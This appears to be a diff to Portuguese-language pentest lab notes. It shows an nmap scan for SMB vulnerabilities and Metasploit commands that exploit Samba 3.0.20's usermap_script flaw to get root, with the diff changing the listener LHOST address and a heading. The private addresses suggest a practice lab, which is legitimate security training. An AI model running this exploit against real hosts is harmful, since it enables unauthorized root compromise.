@@ -75,14 +75,14 @@ verificando o server message block (SMB) para vulnerabilidades &#x2013;>
     sudo nmap -sV -vv --script='smb-vuln-ms*' -p445 172.18.0.3 -oX result.xml
 
 
-# SMB Remote Code Execution
+# RCE no Samba 
 
 explorando o Samba 3.0.20 (usermap<sub>script</sub>) para ganhar acesso root -->
 
     msfconsole -q
     use exploit/multi/samba/usermap_script
     set RHOSTS 172.18.0.3
-    set LHOST 172.18.0.2
+    set LHOST 172.18.0.1
     exploit
 
 verificando o acesso obtido -->
